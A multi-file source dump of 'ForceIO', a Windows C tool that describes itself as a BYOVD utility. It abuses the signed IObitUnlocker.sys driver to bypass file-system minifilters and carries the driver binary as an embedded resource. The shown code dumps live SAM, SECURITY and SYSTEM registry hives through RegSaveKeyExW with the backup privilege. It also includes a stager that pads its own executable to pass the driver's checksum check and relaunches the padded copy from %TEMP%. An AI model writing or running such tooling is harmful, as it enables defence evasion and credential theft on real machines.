+<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Release|Win32">
+      <Configuration>Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <Keyword>Win32Proj</Keyword>
+    <ProjectGuid>{F01CE100-B1AD-4D00-9E7F-A88677002B00}</ProjectGuid>
+    <RootNamespace>ForceIO</RootNamespace>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>$(DefaultPlatformToolset)</PlatformToolset>
+    <WholeProgramOptimization>false</WholeProgramOptimization>
+    <CharacterSet>Unicode</CharacterSet>
+    <OutDir>$(ProjectDir)..\bin\</OutDir>
+    <IntDir>$(ProjectDir)..\obj\$(Platform)\$(Configuration)\</IntDir>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings">
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <ClCompile>
+      <WarningLevel>Level4</WarningLevel>
+      <TreatWarningAsError>true</TreatWarningAsError>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>false</SDLCheck>
+      <PreprocessorDefinitions>NDEBUG;WIN32;_WINDOWS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <Optimization>MinSpace</Optimization>
+      <BufferSecurityCheck>false</BufferSecurityCheck>
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+      <CompileAs>CompileAsC</CompileAs>
+      <AdditionalOptions>/UTF-8 %(AdditionalOptions)</AdditionalOptions>
+    </ClCompile>
+    <ResourceCompile>
+      <AdditionalOptions>/c65001 %(AdditionalOptions)</AdditionalOptions>
+    </ResourceCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>false</GenerateDebugInformation>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <EntryPointSymbol>Entry</EntryPointSymbol>
+      <IgnoreAllDefaultLibraries>true</IgnoreAllDefaultLibraries>
+      <AdditionalDependencies>kernel32.lib;advapi32.lib;cabinet.lib</AdditionalDependencies>
+      <EnableUAC>true</EnableUAC>
+      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
+      <UACUIAccess>false</UACUIAccess>
+      <AdditionalOptions>/BREPRO %(AdditionalOptions)</AdditionalOptions>
+    </Link>
+    <Manifest>
+      <AdditionalManifestFiles>$(ProjectDir)ForceIO.manifest;%(AdditionalManifestFiles)</AdditionalManifestFiles>
+      <EmbedManifest>true</EmbedManifest>
+    </Manifest>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <ClCompile Include="main.c" />
+    <ClCompile Include="Console.c" />
+    <ClCompile Include="DriverSession.c" />
+    <ClCompile Include="DriverExtract.c" />
+    <ClCompile Include="DeviceIO.c" />
+    <ClCompile Include="HiveIO.c" />
+    <ClCompile Include="Stager.c" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="Console.h" />
+    <ClInclude Include="DriverSession.h" />
+    <ClInclude Include="DriverExtract.h" />
+    <ClInclude Include="DeviceIO.h" />
+    <ClInclude Include="PathSafety.h" />
+    <ClInclude Include="HiveIO.h" />
+    <ClInclude Include="Stager.h" />
+    <ClInclude Include="GenIconSize.h" />
+    <ClInclude Include="Resource.h" />
+  </ItemGroup>
+  <ItemGroup>
+    <ResourceCompile Include="ForceIO.rc" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="ForceIO.manifest" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets">
+  </ImportGroup>
+</Project>
+
+```
+
+`src/ForceIO.vcxproj.filters`:
+
+```filters
+<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="Source Files">
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <Extensions>c;cpp;def;odl;idl;hpj;bat;asm;asmx</Extensions>
+    </Filter>
+    <Filter Include="Header Files">
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <Extensions>h;hh;hpp;hxx;hm;inl;inc;xsd</Extensions>
+    </Filter>
+    <Filter Include="Resource Files">
+      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
+      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="main.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="Console.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="DriverSession.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="DriverExtract.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="DeviceIO.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="HiveIO.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="Console.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="DriverSession.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="DriverExtract.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="DeviceIO.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="PathSafety.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="HiveIO.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="GenIconSize.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="Resource.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+  </ItemGroup>
+  <ItemGroup>
+    <ResourceCompile Include="ForceIO.rc">
+      <Filter>Resource Files</Filter>
+    </ResourceCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="ForceIO.manifest">
+      <Filter>Resource Files</Filter>
+    </None>
+  </ItemGroup>
+</Project>
+
+```
+
+`src/HiveIO.c`:
+
+```c
+// HiveIO.c
+// Registry hive copy via RegSaveKeyExW.
+//
+// When source path matches a mounted hive in the kernel hivelist the IOCTL path
+// is useless (ERROR_SHARING_VIOLATION from the registry manager, not WdFilter).
+// RegSaveKeyExW asks the registry manager to flush a consistent snapshot to disk,
+// which works even on SAM/SECURITY/SYSTEM that are otherwise inaccessible.
+//
+// © WESMAR Marek Wesołowski
+
+#define WIN32_LEAN_AND_MEAN
+#include <windows.h>
+#include "HiveIO.h"
+
+// ── helpers (no CRT) ─────────────────────────────────────────────────────────
+
+static int hlen(const wchar_t* s) {
+    const wchar_t* p = s; while (*p) p++; return (int)(p - s);
+}
+
+static void hcopy(wchar_t* dst, const wchar_t* src, int max) {
+    int i = 0;
+    while (i < max - 1 && src[i]) { dst[i] = src[i]; i++; }
+    dst[i] = 0;
+}
+
+// Case-insensitive wide-string equality (ASCII range only, sufficient for NT paths).
+static int hicmp(const wchar_t* a, const wchar_t* b) {
+    while (*a && *b) {
+        wchar_t ca = (*a >= L'A' && *a <= L'Z') ? *a + 32 : *a;
+        wchar_t cb = (*b >= L'A' && *b <= L'Z') ? *b + 32 : *b;
+        if (ca != cb) return 0;
+        a++; b++;
+    }
+    return *a == *b;
+}
+
+// ── path conversion ───────────────────────────────────────────────────────────
+
+// "C:\Windows\System32\config\SAM"  ->  "\Device\HarddiskVolumeN\Windows\System32\config\SAM"
+// Returns 0 if path is not a drive-letter path or device name lookup fails.
+static int PathToNT(const wchar_t* path, wchar_t* ntPath, int ntMax) {
+    if (hlen(path) < 3) return 0;
+    wchar_t c0 = path[0];
+    if (!((c0 >= L'A' && c0 <= L'Z') || (c0 >= L'a' && c0 <= L'z'))) return 0;
+    if (path[1] != L':') return 0;
+    if (path[2] != L'\\' && path[2] != L'/') return 0;
+
+    wchar_t drive[3] = { c0, L':', 0 };
+    wchar_t device[512];
+    if (!QueryDosDeviceW(drive, device, 512)) return 0;
+
+    int dlen = hlen(device);
+    const wchar_t* rest = path + 2;   // "\foo\bar" (starts with backslash)
+    int rlen = hlen(rest);
+    if (dlen + rlen + 1 >= ntMax) return 0;
+
+    hcopy(ntPath, device, ntMax);
+    int i = 0;
+    for (; rest[i] && dlen + i < ntMax - 1; i++)
+        ntPath[dlen + i] = rest[i];
+    ntPath[dlen + i] = 0;
+    return 1;
+}
+
+// ── registry path parser ──────────────────────────────────────────────────────
+
+// Hivelist value names look like:
+//   \REGISTRY\MACHINE\SAM         -> HKLM, subkey "SAM"
+//   \REGISTRY\USER\S-1-5-21-...-500  -> HKU, subkey "S-1-5-21-...-500"
+//   \REGISTRY\USER\.DEFAULT       -> HKU, subkey ".DEFAULT"
+//   \REGISTRY\MACHINE\BCD00000000 -> HKLM, subkey "BCD00000000"
+//   \REGISTRY\WC\...              -> skip (container hives, not standard users)
+static int ParseHiveRegPath(const wchar_t* name, HKEY* rootOut, wchar_t* subOut, int subMax) {
+    static const wchar_t kM[] = L"\\REGISTRY\\MACHINE\\";
+    static const wchar_t kU[] = L"\\REGISTRY\\USER\\";
+    int mlen = (int)(sizeof(kM) / sizeof(wchar_t) - 1);
+    int ulen = (int)(sizeof(kU) / sizeof(wchar_t) - 1);
+    int nlen = hlen(name);
+
+    if (nlen > mlen) {
+        int ok = 1;
+        for (int i = 0; i < mlen; i++) {
+            wchar_t a = name[i], b = kM[i];
+            if (a >= L'A' && a <= L'Z') a += 32;
+            if (b >= L'A' && b <= L'Z') b += 32;
+            if (a != b) { ok = 0; break; }
+        }
+        if (ok) { *rootOut = HKEY_LOCAL_MACHINE; hcopy(subOut, name + mlen, subMax); return 1; }
+    }
+
+    if (nlen > ulen) {
+        int ok = 1;
+        for (int i = 0; i < ulen; i++) {
+            wchar_t a = name[i], b = kU[i];
+            if (a >= L'A' && a <= L'Z') a += 32;
+            if (b >= L'A' && b <= L'Z') b += 32;
+            if (a != b) { ok = 0; break; }
+        }
+        if (ok) { *rootOut = HKEY_USERS; hcopy(subOut, name + ulen, subMax); return 1; }
+    }
+
+    return 0;
+}
+
+// ── public API ────────────────────────────────────────────────────────────────
+
+int HiveIO_IsHivePath(const wchar_t* path, HKEY* rootKeyOut,
+                      wchar_t* subKeyOut, int subMax) {
+    // Static to keep stack frame < 4KB (avoids __chkstk with /NODEFAULTLIB).
+    static wchar_t ntPath[1024];
+    static wchar_t vName[512];
+    static wchar_t vData[1024];
+
+    if (!PathToNT(path, ntPath, 1024)) return 0;
+
+    HKEY hList = NULL;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
+                      L"SYSTEM\\CurrentControlSet\\Control\\hivelist",
+                      0, KEY_QUERY_VALUE, &hList) != ERROR_SUCCESS)
+        return 0;
+
+    int found = 0;
+    DWORD idx = 0;
+
+    for (;;) {
+        DWORD cchName = 512, cbData = sizeof(vData), type = 0;
+        LSTATUS s = RegEnumValueW(hList, idx++, vName, &cchName, NULL, &type,
+                                  (BYTE*)vData, &cbData);
+        if (s == ERROR_NO_MORE_ITEMS) break;
+        if (s != ERROR_SUCCESS) continue;
+        // Skip HARDWARE entry (empty data) and non-string values
+        if ((type != REG_SZ && type != REG_EXPAND_SZ) || cbData < 4) continue;
+
+        if (hicmp(vData, ntPath)) {
+            wchar_t sk[512];
+            HKEY rk = NULL;
+            if (ParseHiveRegPath(vName, &rk, sk, 512)) {
+                *rootKeyOut = rk;
+                hcopy(subKeyOut, sk, subMax);
+                found = 1;
+            }
+            break;
+        }
+    }
+
+    RegCloseKey(hList);
+    return found;
+}
+
+DWORD HiveIO_Save(HKEY rootKey, const wchar_t* subKey, const wchar_t* destPath, BOOL replaceExisting) {
+    // Export beside the destination, then publish only the completed snapshot.
+    if (!destPath || !destPath[0]) return ERROR_INVALID_NAME;
+    if (!rootKey || !subKey) return ERROR_INVALID_HANDLE;
+    if (!replaceExisting && GetFileAttributesW(destPath) != INVALID_FILE_ATTRIBUTES)
+        return ERROR_ALREADY_EXISTS;
+    // SE_BACKUP_NAME is required by RegSaveKeyExW
+    HANDLE hToken = NULL;
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
+        TOKEN_PRIVILEGES tp;
+        LUID luid;
+        if (LookupPrivilegeValueW(NULL, SE_BACKUP_NAME, &luid)) {
+            tp.PrivilegeCount = 1;
+            tp.Privileges[0].Luid = luid;
+            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+            AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
+        }
+        CloseHandle(hToken);
+    }
+
+    HKEY hKey = NULL;
+    LSTATUS s = RegOpenKeyExW(rootKey, subKey, 0, KEY_READ, &hKey);
+    if (s != ERROR_SUCCESS) return (DWORD)s;
+
+    wchar_t fullPath[MAX_PATH], directory[MAX_PATH], staging[MAX_PATH];
+    wchar_t* fileName = NULL;
+    DWORD length = GetFullPathNameW(destPath, MAX_PATH, fullPath, &fileName);
+    if (!length || length >= MAX_PATH || !fileName || !*fileName) {
+        DWORD error = !length ? GetLastError() :
+            (length >= MAX_PATH ? ERROR_FILENAME_EXCED_RANGE : ERROR_INVALID_NAME);
+        RegCloseKey(hKey);
+        return error;
+    }
+    hcopy(directory, fullPath, MAX_PATH);
+    directory[fileName - fullPath] = 0;
+    if (!GetTempFileNameW(directory, L"fio", 0, staging)) {
+        DWORD error = GetLastError();
+        RegCloseKey(hKey);
+        return error;
+    }
+    // RegSaveKeyExW requires a name that does not already exist.
+    if (!DeleteFileW(staging)) {
+        DWORD error = GetLastError();
+        RegCloseKey(hKey);
+        return error;
+    }
+    s = RegSaveKeyExW(hKey, staging, NULL, REG_LATEST_FORMAT);
+    RegCloseKey(hKey);
+    if (s == ERROR_SUCCESS &&
+        !MoveFileExW(staging, fullPath, MOVEFILE_WRITE_THROUGH |
+            (replaceExisting ? MOVEFILE_REPLACE_EXISTING : 0)))
+        s = (LSTATUS)GetLastError();
+    if (s != ERROR_SUCCESS) DeleteFileW(staging);
+    return (s == ERROR_SUCCESS) ? 0 : (DWORD)s;
+}
+
+```
+
+`src/HiveIO.h`:
+
+```h
+// HiveIO.h
+// Registry hive detection and RegSaveKeyExW-based copy.
+//
+// Handles mounted hive files that the kernel locks exclusively via the registry
+// manager (SAM, SYSTEM, SOFTWARE, SECURITY, DEFAULT, NTUSER.DAT, UsrClass.dat,
+// and any other hive visible in the kernel hivelist).  These files cannot be
+// copied by the IObitUnlocker IOCTL because the locking is not a minifilter oplock
+// but a kernel-level hive mapping — the IOCTL path returns ERROR_SHARING_VIOLATION.
+// RegSaveKeyExW bypasses this by going through the registry manager itself.
+//
+// © WESMAR Marek Wesołowski
+
+#pragma once
+#include <windows.h>
+
+// Returns non-zero if `path` points to the physical file of a currently mounted
+// registry hive (matched against HKLM\SYSTEM\...\hivelist at runtime).
+// On success fills rootKeyOut (HKEY_LOCAL_MACHINE or HKEY_USERS) and subKeyOut
+// with the subkey string, e.g. L"SAM" or L"S-1-5-21-...-500".
+int   HiveIO_IsHivePath(const wchar_t* path, HKEY* rootKeyOut,
+                        wchar_t* subKeyOut, int subMax);
+
+// Export a live hive to destPath via RegSaveKeyExW (REG_LATEST_FORMAT).
+// Enables SE_BACKUP_NAME privilege before the call.
+// Exports to a temporary sibling and replaces destPath only after a successful
+// export. Existing destinations require replaceExisting to be explicitly TRUE.
+// An existing backup is preserved if export or publication fails.
+// Returns Win32 error code (0 = success).
+DWORD HiveIO_Save(HKEY rootKey, const wchar_t* subKey, const wchar_t* destPath, BOOL replaceExisting);
+
+```
+
+`src/PathSafety.h`:
+
+```h
+// Fail-closed path checks for destructive file operations.
+#pragma once
+#include <windows.h>
+
+#define FORCEIO_PATH_CAPACITY 264
+
+static __inline DWORD PathSafety_Resolve(const wchar_t* path, wchar_t* full) {
+    DWORD length = 0;
+    if (!path || !path[0]) return ERROR_INVALID_NAME;
+    while (length < FORCEIO_PATH_CAPACITY && path[length]) length++;
+    if (length >= FORCEIO_PATH_CAPACITY) return ERROR_FILENAME_EXCED_RANGE;
+    length = GetFullPathNameW(path, FORCEIO_PATH_CAPACITY, full, NULL);
+    if (!length) return GetLastError();
+    if (length >= FORCEIO_PATH_CAPACITY) return ERROR_FILENAME_EXCED_RANGE;
+    // Device namespaces need different parsing and are deliberately rejected.
+    if (full[0] == L'\\' && full[1] == L'\\' &&
+        (full[2] == L'?' || full[2] == L'.')) return ERROR_INVALID_NAME;
+    for (DWORD i = 0; i < length; i++) {
+        if (full[i] == L'/') full[i] = L'\\';
+    }
+    while (length > 3 && full[length - 1] == L'\\') full[--length] = 0;
+    return ERROR_SUCCESS;
+}
+
+static __inline DWORD PathSafety_Check(const wchar_t* path) {
+    wchar_t full[FORCEIO_PATH_CAPACITY];
+    DWORD err = PathSafety_Resolve(path, full);
+    DWORD start = 3;
+    if (err) return err;
+    if (full[0] == L'\\' && full[1] == L'\\') {
+        // Skip the server name; check the share root and every child.
+        start = 2;
+        while (full[start] && full[start] != L'\\') start++;
+        if (!full[start]) return ERROR_INVALID_NAME;
+        start++;
+    }
+    for (DWORD i = start; ; i++) {
+        wchar_t saved = full[i];
+        if (saved != L'\\' && saved != 0) continue;
+        full[i] = 0;
+        DWORD attr = GetFileAttributesW(full);
+        DWORD attrError = (attr == INVALID_FILE_ATTRIBUTES) ? GetLastError() : 0;
+        full[i] = saved;
+        if (attr == INVALID_FILE_ATTRIBUTES) {
+            if (attrError != ERROR_FILE_NOT_FOUND && attrError != ERROR_PATH_NOT_FOUND)
+                return attrError;
+        } else if (attr & FILE_ATTRIBUTE_REPARSE_POINT) {
+            return ERROR_NOT_SUPPORTED;
+        }
+        if (!saved) break;
+    }
+    return ERROR_SUCCESS;
+}
+
+static __inline DWORD PathSafety_CheckPair(const wchar_t* src, const wchar_t* dst) {
+    wchar_t source[FORCEIO_PATH_CAPACITY], target[FORCEIO_PATH_CAPACITY];
+    DWORD err = PathSafety_Check(src);
+    if (err) return err;
+    err = PathSafety_Check(dst);
+    if (err) return err;
+    err = PathSafety_Resolve(src, source);
+    if (err) return err;
+    err = PathSafety_Resolve(dst, target);
+    if (err) return err;
+    if (CompareStringOrdinal(source, -1, target, -1, TRUE) == CSTR_EQUAL)
+        return ERROR_INVALID_PARAMETER;
+    DWORD attr = GetFileAttributesW(source);
+    if (attr == INVALID_FILE_ATTRIBUTES) {
+        DWORD attrError = GetLastError();
+        // This is a safety check, not a source-existence check. The caller may
+        // resolve a logical source through another API (for example a hive).
+        // Ordinary file operations still check existence in their own backend.
+        if (attrError == ERROR_FILE_NOT_FOUND || attrError == ERROR_PATH_NOT_FOUND)
+            return ERROR_SUCCESS;
+        return attrError;
+    }
+    if (attr & FILE_ATTRIBUTE_DIRECTORY) {
+        int length = 0, targetLength = 0;
+        while (source[length]) length++;
+        while (target[targetLength]) targetLength++;
+        if (targetLength > length &&
+            (source[length - 1] == L'\\' || target[length] == L'\\') &&
+            CompareStringOrdinal(source, length, target, length, TRUE) == CSTR_EQUAL)
+            return ERROR_INVALID_PARAMETER;
+    }
+    return ERROR_SUCCESS;
+}
+
+```
+
+`src/Resource.h`:
+
+```h
+//{{NO_DEPENDENCIES}}
+// Resource identifiers for ForceIO
+// © WESMAR Marek Wesołowski
+
+#pragma once
+
+#define MAIN_ICON               101
+#define IDR_DRIVER_PAYLOAD      102
+
+```
+
+`src/Stager.c`:
+
+```c
+// Stager.c
+// Dynamic in-flight mathematical checksum stager for ForceIO.
+// © WESMAR Marek Wesołowski
+
+#include "Stager.h"
+
+void* memset(void* dest, int val, size_t count);
+
+static void UIntToDecW(DWORD val, WCHAR* out) {
+    WCHAR tmp[16];
+    int i = 0;
+    if (val == 0) {
+        tmp[i++] = L'0';
+    } else {
+        while (val > 0) {
+            tmp[i++] = (WCHAR)(L'0' + (val % 10));
+            val /= 10;
+        }
+    }
+    int j = 0;
+    while (i > 0) {
+        out[j++] = tmp[--i];
+    }
+    out[j] = 0;
+}
+
+static void ComputeChecksums(const unsigned char* data, DWORD len, unsigned char* outXor, unsigned int* outAlt) {
+    unsigned char x = 0;
+    unsigned int a = 0;
+    for (DWORD i = 0; i < len; i++) {
+        x ^= data[i];
+        if ((i & 1) == 0) {
+            a += (unsigned int)data[i];
+        } else {
+            a -= (unsigned int)data[i];
+        }
+    }
+    *outXor = x;
+    *outAlt = a;
+}
+
+BOOL Stager_EnsurePadded(DWORD* pExitCode) {
+    // 1. If we are already running as the staged worker, execute directly.
+    WCHAR envVal[8];
+    if (GetEnvironmentVariableW(L"_FORCEIO_WORKER", envVal, 8) > 0) {
+        return FALSE;
+    }
+
+    // 2. Locate own executable.
+    static WCHAR selfPath[MAX_PATH];
+    DWORD len = GetModuleFileNameW(NULL, selfPath, MAX_PATH);
+    if (len == 0 || len >= MAX_PATH) {
+        return FALSE;
+    }
+
+    // 3. Open self for reading.
+    HANDLE hSelf = CreateFileW(selfPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    if (hSelf == INVALID_HANDLE_VALUE) {
+        return FALSE;
+    }
+
+    DWORD fileSize = GetFileSize(hSelf, NULL);
+    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
+        CloseHandle(hSelf);
+        return FALSE;
+    }
+
+    // Allocate buffer for self + up to 131072 bytes of overlay padding
+    DWORD maxAlloc = fileSize + 131072;
+    unsigned char* buf = (unsigned char*)VirtualAlloc(NULL, maxAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!buf) {
+        CloseHandle(hSelf);
+        return FALSE;
+    }
+
+    DWORD bytesRead = 0;
+    if (!ReadFile(hSelf, buf, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
+        VirtualFree(buf, 0, MEM_RELEASE);
+        CloseHandle(hSelf);
+        return FALSE;
+    }
+    CloseHandle(hSelf);
+
+    // 4. Check if current file already satisfies driver checksum requirements.
+    unsigned char curXor = 0;
+    unsigned int curAlt = 0;
+    ComputeChecksums(buf, fileSize, &curXor, &curAlt);
+
+    if (curXor == FORCEIO_TARGET_XOR && curAlt == FORCEIO_TARGET_ALT) {
+        // Pre-padded standalone binary — proceed directly without spawning worker!
+        VirtualFree(buf, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    // 5. Compute dynamic mathematical padding.
+    DWORD alignedSize = fileSize;
+    if (alignedSize & 1) {
+        buf[alignedSize++] = 0;
+        ComputeChecksums(buf, alignedSize, &curXor, &curAlt);
+    }
+
+    unsigned int alt_need = FORCEIO_TARGET_ALT - curAlt;
+    unsigned int bulk = alt_need / 255;
+    unsigned int remain = alt_need % 255;
+    unsigned char xor_after = (unsigned char)(curXor ^ ((bulk & 1) ? 0xFF : 0x00));
+    unsigned char xor_need = (unsigned char)(xor_after ^ FORCEIO_TARGET_XOR);
+
+    if (alignedSize + (bulk * 2) + 4 > maxAlloc) {
+        VirtualFree(buf, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    unsigned char b0 = 0, b1 = 0, b2 = 0, b3 = 0;
+    BOOL found = FALSE;
+    for (int i0 = 0; i0 < 256 && !found; i0++) {
+        for (int i2 = 0; i2 < 256 && !found; i2++) {
+            int odd_sum = i0 + i2 - (int)remain;
+            int odd_xor = i0 ^ i2 ^ (int)xor_need;
+            if (odd_sum < 0 || odd_sum > 510) continue;
+            int diff = odd_sum - odd_xor;
+            if (diff < 0 || (diff & 1) != 0) continue;
+            for (int i1 = 0; i1 < 256; i1++) {
+                int i3 = odd_sum - i1;
+                if (i3 >= 0 && i3 <= 255 && ((i1 ^ i3) == odd_xor)) {
+                    b0 = (unsigned char)i0;
+                    b1 = (unsigned char)i1;
+                    b2 = (unsigned char)i2;
+                    b3 = (unsigned char)i3;
+                    found = TRUE;
+                    break;
+                }
+            }
+        }
+    }
+
+    if (!found) {
+        VirtualFree(buf, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    // Append bulk pairs (0xFF, 0x00)
+    DWORD p = alignedSize;
+    for (DWORD k = 0; k < bulk; k++) {
+        buf[p++] = 0xFF;
+        buf[p++] = 0x00;
+    }
+    buf[p++] = b0;
+    buf[p++] = b1;
+    buf[p++] = b2;
+    buf[p++] = b3;
+    DWORD totalPaddedSize = p;
+
+    // 6. Build temporary executable path in %TEMP%.
+    static WCHAR tempPath[MAX_PATH];
+    DWORD tlen = GetTempPathW(MAX_PATH, tempPath);
+    if (tlen == 0 || tlen >= MAX_PATH - 64) {
+        VirtualFree(buf, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    // Append: fio_wk_<PID>_<Tick>.exe
+    WCHAR* end = tempPath + tlen;
+    if (end > tempPath && *(end - 1) != L'\\') {
+        *end++ = L'\\';
+    }
+
+    const WCHAR* prefix = L"fio_wk_";
+    while (*prefix) *end++ = *prefix++;
+
+    WCHAR pidStr[16];
+    UIntToDecW(GetCurrentProcessId(), pidStr);
+    WCHAR* s = pidStr;
+    while (*s) *end++ = *s++;
+
+    *end++ = L'_';
+
+    WCHAR tickStr[16];
+    UIntToDecW(GetTickCount(), tickStr);
+    s = tickStr;
+    while (*s) *end++ = *s++;
+
+    const WCHAR* ext = L".exe";
+    while (*ext) *end++ = *ext++;
+    *end = 0;
+
+    // 7. Write padded binary to temporary file.
+    HANDLE hOut = CreateFileW(tempPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL);
+    if (hOut == INVALID_HANDLE_VALUE) {
+        VirtualFree(buf, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    DWORD bytesWritten = 0;
+    BOOL writeOk = WriteFile(hOut, buf, totalPaddedSize, &bytesWritten, NULL);
+    CloseHandle(hOut);
+    VirtualFree(buf, 0, MEM_RELEASE);
+
+    if (!writeOk || bytesWritten != totalPaddedSize) {
+        DeleteFileW(tempPath);
+        return FALSE;
+    }
+
+    // 8. Launch child worker with inherited console handles and _FORCEIO_WORKER=1.
+    SetEnvironmentVariableW(L"_FORCEIO_WORKER", L"1");
+
+    STARTUPINFOW si;
+    PROCESS_INFORMATION pi;
+    memset(&si, 0, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES;
+    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
+    si.hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
+    si.hStdError = GetStdHandle(STD_ERROR_HANDLE);
+    memset(&pi, 0, sizeof(pi));
+
+    static WCHAR cmdBuffer[4096];
+    const WCHAR* rawCmd = GetCommandLineW();
+    int ci = 0;
+    while (rawCmd[ci] && ci < 4095) {
+        cmdBuffer[ci] = rawCmd[ci];
+        ci++;
+    }
+    cmdBuffer[ci] = 0;
+
+    BOOL cpOk = CreateProcessW(tempPath, cmdBuffer, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+    if (!cpOk) {
+        DeleteFileW(tempPath);
+        return FALSE;
+    }
+
+    // 9. Wait for worker to finish.
+    WaitForSingleObject(pi.hProcess, INFINITE);
+
+    DWORD exitCode = 0;
+    GetExitCodeProcess(pi.hProcess, &exitCode);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    // 10. Clean up temporary worker executable immediately.
+    DeleteFileW(tempPath);
+
+    if (pExitCode) {
+        *pExitCode = exitCode;
+    }
+    return TRUE;
+}
+
+```
+
+`src/Stager.h`:
+
+```h
+#pragma once
+#include <windows.h>
+
+#define FORCEIO_TARGET_XOR 0x2B
+#define FORCEIO_TARGET_ALT 0x00A88677
+
+// Checks if the current process is already running as a worker,
+// or if its on-disk image already matches the required driver checksums.
+// If unpadded, creates a temporary patched worker in %TEMP%, executes it,
+// waits for it, deletes the temporary file, and sets *pExitCode.
+// Returns TRUE if worker was launched and finished (caller should ExitProcess(*pExitCode)).
+// Returns FALSE if caller should execute directly.
+BOOL Stager_EnsurePadded(DWORD* pExitCode);
+
+```
+
+`src/main.c`:
+
+```c
+// main.c
+// ForceIO — minifilter-bypass file operations via signed IObitUnlocker.sys driver.
+//
+// Standalone BYOVD tool. No CRT, no IObit DLL/EXE dependency.
+// The driver binary is embedded as a PE resource and extracted at runtime.
+//
+// © WESMAR Marek Wesołowski
+
+#define WIN32_LEAN_AND_MEAN
+#include <windows.h>
+
+#include "Console.h"
+#include "DriverSession.h"
+#include "DeviceIO.h"
+#include "HiveIO.h"
+#include "PathSafety.h"
+#include "Stager.h"
+
+int _fltused = 0;
+
+static int wlen(const wchar_t* s) {
